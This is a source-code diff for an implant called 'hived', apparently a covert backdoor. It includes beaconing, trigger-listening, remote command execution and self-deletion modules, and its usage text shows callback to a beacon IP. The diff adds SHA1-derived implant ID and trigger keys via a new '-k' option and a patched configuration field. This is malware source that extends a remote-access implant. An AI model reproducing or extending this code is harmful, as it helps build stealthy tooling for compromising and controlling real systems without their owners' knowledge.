@@ -11,7 +11,6 @@
 #include "proj_strings_main.h"
 #include "string_utils.h"
 #include "function_strings.h"
-
 #include "debug.h"
 #include "trigger_listen.h"
 #include "beacon.h"
@@ -21,6 +20,10 @@
 #include "self_delete.h"
 #include "threads.h"
 #include "run_command.h"
+
+//PolarSSL Files
+#include "polarssl/include/polarssl/config.h"
+#include "polarssl/include/polarssl/sha1.h"
 
 #ifndef _SRANDFLAG_
 #define _SRANDFLAG_
@@ -46,6 +49,25 @@ int wsa_init_done;
 extern int wsa_init_done;
 #endif
 
+//declare displaySha1Hash function
+void displaySha1Hash(char *label, unsigned char *sha1Hash);
+//define displaySha1Hash function
+void displaySha1Hash(char *label, unsigned char *sha1Hash)
+{
+	int i=0;
+
+	//Display Label
+	D( printf( " DEBUG: %s=[", label ); );
+
+	//Display 40 hexadecimal number array
+	for (i=0; i<20; i++)
+	{
+	   D( printf("%02x",sha1Hash[i]); );
+	}
+	D( printf( "]\n" ); );
+
+}
+
 //**************************************************************
 struct cl_args
 {
@@ -54,6 +76,7 @@ struct cl_args
 	unsigned int	host_len;
 	char		beacon_ip[256];
 	char		iface[16];
+	unsigned char   idKey[20];
 	unsigned long	init_delay;
 	unsigned int	interval;
 	unsigned int	trigger_delay;
@@ -63,7 +86,7 @@ struct cl_args
 };
 
 #define SIG_HEAD	0x7AD8CFB6
-struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, 0, 0, 0, 0, 0, 0 };
+struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
 
 //**************************************************************
 D (
@@ -74,6 +97,7 @@ static void printUsage(char* exeName)
 	printf("\t\t-a <address>           - beacon IP address to callback to\n");
 	printf("\t\t-p <port>              - beacon port (default: 443)\n");
 	printf("\t\t-i <interval>          - beacon interval in seconds\n");
+	printf("\t\t-k <id key>            - implant Key derived from patching keyPhrase \n");
 	printf("\t\t-j <jitter>            - integer for percent jitter (0 <= jitter <= 30, default: 3 )\n");
 #ifdef SOLARIS
 	printf("\t\t-I <interface>         - interface on which to listen\n");
@@ -84,7 +108,7 @@ static void printUsage(char* exeName)
 	printf("\t\t-h                     - print this help menu\n");
 
 	printf( "\n\tExample:\n" );
-	printf( "\t\t./hived-solaris-sparc-dbg -a 10.3.2.76 -p 9999 -i 100000 -I hme0\n" );
+	printf( "\t\t./hived-solaris-sparc-dbg -a 10.3.2.76 -p 9999 -i 100000 -I hme0 -k Testing \n" );
 	printf("\n");
 	return;
 }
@@ -103,6 +127,8 @@ int main(int argc, char** argv)
 	int		c = 0;
 	char		*beaconIP = NULL;
 	char		*szInterface = NULL;
+	unsigned char   idKey[20];
+	unsigned char   tempSha1Hash[20];   
 	int		beaconPort = DEFAULT_BEACON_PORT;
 	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
 	int		interval = DEFAULT_BEACON_INTERVAL;
@@ -227,6 +253,7 @@ int main(int argc, char** argv)
 		szInterface = args.iface;
 		initialDelay = args.init_delay;
 		interval = args.interval;
+		memcpy( idKey, args.idKey, 20*sizeof(unsigned char) );           //Copy patched idKey
 		trigger_delay = args.trigger_delay;
 		delete_delay = args.delete_delay;
 		jitter = args.jitter * 0.01f;
@@ -267,6 +294,22 @@ int main(int argc, char** argv)
 			case 'i':
 				// user enters delay in seconds and this is converted to milliseconds
 				interval = atoi(optarg) * 1000;
+				break;
+
+			case 'k':
+				// user keyPhrase used for id 
+                                if ( strlen( optarg ) < 8 )
+                                {
+                                        printf( " ERROR: Insufficient length for keyPhrase entered, must be greater than 7 characters limit\n" );
+                                        return -1;
+                                }
+
+                                sha1( (const unsigned char*) optarg, strlen(optarg), tempSha1Hash);    //Compute sha1 hash of keyPhrase1Hash
+                                sha1( (const unsigned char*) tempSha1Hash, 20*sizeof(unsigned char), idKey); 
+				D( printf( "\n\n\n DEBUG: keyPhrase=%s \n", optarg) );
+				displaySha1Hash ("triggerKey", tempSha1Hash);
+				displaySha1Hash ("idKey", idKey);
+				D( printf( "]\n\n\n" ); );
 				break;
 
 			case 't':
